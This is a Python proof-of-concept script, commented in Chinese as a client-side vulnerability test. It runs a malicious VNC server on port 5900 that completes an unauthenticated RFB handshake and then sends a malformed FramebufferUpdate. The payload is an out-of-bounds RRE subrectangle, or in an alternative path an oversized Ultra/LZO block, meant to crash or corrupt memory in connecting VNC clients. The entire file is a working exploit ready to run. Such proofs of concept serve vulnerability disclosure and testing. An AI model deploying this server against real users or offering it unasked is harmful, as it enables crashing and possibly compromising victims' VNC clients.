#! /usr/bin/env python3
# 客户端漏洞，此脚本是创建一个恶意服务器。
import asyncio
import struct
import lzo
import time

class EvilVNCProtocol(asyncio.Protocol):

    def connection_made(self, transport):
        self.transport = transport
        # Note that we just ignore whatever the client says
        self.transport.write(b"RFB 003.008\n")
        # Send supported security types (1 - None)
        self.transport.write(b"\x01\x01")
        # Confirm that authentication succeeded
        self.transport.write(b"\x00\x00\x00\x00")
        # Send ServerInit
        self.transport.write(
            struct.pack(">HHBBBBHHHBBBBBBIB",
                        100, 100, # Framebuffer width and height
                        32, # Bits per pixel
                        8, # Color depth
                        1, # Big endian
                        1, # True Color
                        255, 255, 255, # Color max values
                        0, 8, 16, # Color shifts
                        0, 0, 0, # Padding
                        1, # Name length
                        ord("E") # Name
            )
        )
        # For some reason, not waiting here led to the client occasionally
        # dropping the rest of the input buffer
        time.sleep(0.2)
        # Send evil FramebufferUpdate
        self.send_copyrect_crash()
        #self.send_ultra_lzo_crash()

    def send_copyrect_crash(self):
        self.transport.write(
            struct.pack(">BBHHHHHi",
                        0, 0, # message-type and padding
                        1, # number-of-rectangles
                        10, 0, # x and y positions
                        10, 10, # Width and height
                        2, # encoding = RRE
            )
        )
        self.transport.write(
            struct.pack(">IIIHHHH",
                        1, # nSubrects
                        0x41414141, # Background pixel value
                        0x42424242, # Rect pixel value
                        10, 10000, 1, 1 # x, y, w, h
            )
        )

    def send_ultra_lzo_crash(self):
        self.transport.write(
            struct.pack(">BBHHHHHi",
                        0, 0, # message-type and padding
                        1, # number-of-rectangles
                        10, 0, # x and y positions
                        10, 10, # Width and height
                        9, # encoding = Ultra
            )
        )
        data = lzo.compress(b"A" * 10000)
        self.transport.write(
            struct.pack(">I",
                        len(data)
            )
        )
        self.transport.write(data)

    def data_received(self, data):
        print(data)


loop = asyncio.get_event_loop()
coro = loop.create_server(EvilVNCProtocol, "0.0.0.0", 5900)
server = loop.run_until_complete(coro)

loop.run_forever()
